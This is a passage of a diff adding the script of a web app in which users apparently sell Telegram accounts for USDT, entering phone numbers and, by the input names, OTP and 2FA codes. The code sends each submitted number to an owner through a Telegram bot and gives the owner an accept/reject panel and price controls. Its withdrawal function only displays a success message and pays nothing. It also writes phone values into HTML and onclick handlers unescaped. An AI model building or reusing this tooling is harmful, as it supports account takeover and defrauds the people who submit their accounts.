+      const price = getPriceForPhone(currentPhone);
+
+      // Add as pending (24hr verification)
+      addAccount(currentPhone, 'pending', false, price);
+
+      // Notify owner
+      notifyOwner(currentPhone, 'new');
+
+      showToast('Account submitted! Verification in progress.', 'success');
+      showScreen('screen-sell');
+      switchTab('pending');
+    }
+  } catch(e) {
+    hideLoading();
+    showError('tfa-error', 'An error occurred. Please try again.');
+  }
+
+  btn.disabled = false; btn.textContent = 'Continue';
+}
+
+// ═══════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════
+function addAccount(phone, status, frozen, price) {
+  // Remove if exists
+  data.accounts = data.accounts.filter(a => a.phone !== phone);
+  data.accounts.push({
+    phone, status, frozen: frozen || false,
+    price: price || null, addedAt: new Date().toISOString()
+  });
+  saveData(data);
+}
+
+function getPriceForPhone(phone) {
+  const stripped = phone.replace('+', '');
+  for (const c of DEFAULT_COUNTRIES) {
+    const prefix = c.prefix.replace('+', '');
+    if (prefix && stripped.startsWith(prefix)) {
+      return data.countries[c.code] || c.price;
+    }
+  }
+  return data.countries['OTHER'] || 0.30;
+}
+
+async function notifyOwner(phone, type) {
+  const msg = type === 'frozen'
+    ? `🚫 *Frozen Account Rejected*\n📞 ${phone}\n❌ Account is banned/frozen by Telegram.`
+    : `📱 *New Account Submitted*\n📞 ${phone}\nPrice: $${getPriceForPhone(phone).toFixed(2)} USDT\n\nUser wants to sell this account.`;
+  try {
+    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CONFIG.OWNER_ID, text: msg, parse_mode: 'Markdown' })
+    });
+  } catch(e) {}
+}
+
+function requestWithdraw() {
+  if ((data.userInfo.balance || 0) <= 0) {
+    showToast('No balance to withdraw', 'error'); return;
+  }
+  showToast('Withdrawal requested! Processing within 24-48hrs.', 'success');
+}
+
+// ═══════════════════════════════════════════
+// OWNER PANEL
+// ═══════════════════════════════════════════
+let editingCountry = null;
+
+function renderOwnerPanel() {
+  // Accounts list
+  const ownerList = document.getElementById('owner-accounts-list');
+  const pending = data.accounts.filter(a => a.status === 'pending');
+  if (pending.length === 0) {
+    ownerList.innerHTML = '<div style="text-align:center;padding:20px;color:var(--muted);font-size:14px">No pending accounts</div>';
+  } else {
+    ownerList.innerHTML = pending.map(a => `
+      <div class="account-card" style="margin-bottom:8px">
+        <div class="account-card-top">
+          <div class="account-phone">${a.phone}</div>
+          <div style="display:flex;gap:8px">
+            <button onclick="ownerAccept('${a.phone}')" style="background:rgba(49,196,141,0.15);color:var(--green);border:none;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer">Accept</button>
+            <button onclick="ownerReject('${a.phone}')" style="background:rgba(239,68,68,0.15);color:var(--red);border:none;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer">Reject</button>
+          </div>
+        </div>
+        <div class="account-tags" style="margin-top:8px">
+          <span class="tag pending">PENDING</span>
+          <span style="font-size:12px;color:var(--muted)">${new Date(a.addedAt).toLocaleString()}</span>
+        </div>
+      </div>
+    `).join('');
+  }
+
+  // Country prices
+  const cList = document.getElementById('country-list');
+  cList.innerHTML = DEFAULT_COUNTRIES.map(c => `
+    <div class="country-item">
+      <div class="country-left">
+        <span class="country-flag">${c.flag}</span>
+        <div>
+          <div class="country-name">${c.name} <span style="color:var(--muted);font-size:12px">${c.prefix}</span></div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="country-price" id="price-${c.code}">$${(data.countries[c.code] || c.price).toFixed(2)}</span>
+        <button class="edit-price-btn" onclick="openSetPrice('${c.code}','${c.name}')">Edit</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function ownerAccept(phone) {
+  const acc = data.accounts.find(a => a.phone === phone);
+  if (acc) { acc.status = 'accepted'; saveData(data); renderOwnerPanel(); showToast('Account accepted', 'success'); }
+}
+function ownerReject(phone) {
+  const acc = data.accounts.find(a => a.phone === phone);
+  if (acc) { acc.status = 'rejected'; saveData(data); renderOwnerPanel(); showToast('Account rejected', 'error'); }
+}
+
+function openSetPrice(code, name) {
+  editingCountry = code;
+  document.getElementById('set-price-title').textContent = `Set price — ${name}`;
+  document.getElementById('input-price').value = (data.countries[code] || 0).toFixed(2);
+  document.getElementById('modal-set-price').classList.add('active');
+}
+
+function confirmSetPrice() {
+  const val = parseFloat(document.getElementById('input-price').value);
+  if (isNaN(val) || val < 0) { showToast('Enter a valid price', 'error'); return; }
+  data.countries[editingCountry] = val;
+  saveData(data);
+  closeModal('modal-set-price');
+  renderOwnerPanel();
+  showToast(`Price updated to $${val.toFixed(2)}`, 'success');
+}
+
+// ═══════════════════════════════════════════
+// MODAL / TOAST HELPERS
+// ═══════════════════════════════════════════
+function showLoading(text) {
+  document.getElementById('loading-text').textContent = text || 'Please wait...';
+  document.getElementById('modal-loading').classList.add('active');
+}
+function hideLoading() {
+  document.getElementById('modal-loading').classList.remove('active');
+}
+function closeModal(id) {
+  document.getElementById(id).classList.remove('active');
+}
+function showError(id, msg) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = msg;
+  const inputId = id.replace('-error', 'input-').replace('phone-error','input-phone')
+                     .replace('otp-error','input-otp').replace('tfa-error','input-2fa');
+  const inp = document.getElementById(inputId);
+  if (inp) { inp.classList.add('error'); setTimeout(() => inp.classList.remove('error'), 3000); }
+}
+function clearError(id) { const el = document.getElementById(id); if (el) el.textContent = ''; }
+
+let toastTimer;
+function showToast(msg, type) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast' + (type ? ' ' + type : '');
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// Fix error display mapping
+function showError(elId, msg) {
+  const el = document.getElementById(elId);
+  if (el) el.textContent = msg;
+}
+</script>
+</body>
+</html>
